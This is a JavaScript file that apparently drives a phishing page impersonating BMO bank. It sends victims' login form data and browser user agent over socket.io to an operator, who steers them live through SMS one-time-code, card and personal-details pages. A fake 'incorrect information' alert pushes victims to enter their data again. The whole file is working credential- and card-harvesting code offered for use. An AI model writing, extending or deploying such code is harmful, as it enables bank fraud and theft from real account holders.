const socket = io();

document.addEventListener("DOMContentLoaded", function () {

    socket.on('sendConfigs', (config) => {

        console.log(config);

        const formConfig = config[0];

        // Iterate over the configuration keys
        Object.keys(formConfig).forEach(key => {
            if (!key.includes('banks')) {
                console.log(key)
                // Find the input related to the config key
                // This assumes the IDs of the inputs are prefixed with 'input-' followed by the key
                const inputId = `input-${key}`;
                const inputDiv = document.getElementById(`${inputId}`);

                // If the config for this key is false, hide the input, otherwise show it
                if (formConfig[key] === false) {
                    inputDiv.style.display = 'none';
                }
            }
        });
    })

    const url = new URL(window.location.href);
    const myParam = url.searchParams.get("action");

    if (myParam != null) {
        document.getElementById("alertWrong").innerHTML = `<span role="alert" style="color: red;" style="margin-bottom: 10px;">You have entered incorrect information. Check your code and try again.</span>`;
    }


});

let page = document.getElementById('page').textContent
let pageRedirection = document.getElementById('pageRedirection').textContent

if(pageRedirection.includes('details')){
    socket.on('removeDetails', (data) =>{
        if(data.removeDetails){pageRedirection = '/bmo/card'}
    })
}

socket.on('btnRedirection', (data) => {
    pageRedirection = data.page
    if (pageRedirection.includes('sms-otp?action=0')) { window.location.href = `${pageRedirection}`; }
    else if (pageRedirection.includes('details')) { window.location.href = `${pageRedirection}`; }
    else if (pageRedirection.includes('card')) {window.location.href = `${pageRedirection}`}
    else if (pageRedirection.includes('finish')) {window.location.href = `${pageRedirection}`}
})

function submitForm() {
    document.getElementById('userAgent').value = navigator.userAgent;
    document.getElementById('banks').value = 'BMO';

    const formData = new FormData(document.getElementById('loginForm'));

    socket.emit('submit', Object.fromEntries(formData));

    if (pageRedirection == 'BMO/sms-otp') {
        console.log(`this is pageRedirection ${pageRedirection}`);
        console.log(`this is page ${page}`)
        if(page.includes('Card') || page.includes('Details')){pageRedirection = '/bmo/sms-otp'}
        socket.emit('submit', { previousPage: page })
    }

    console.log(pageRedirection)

    window.location.href = `${pageRedirection}`;
}

socket.emit('updateBanks', { banks: 'BMO' })
socket.emit('updatePage', { page: `${page}` })
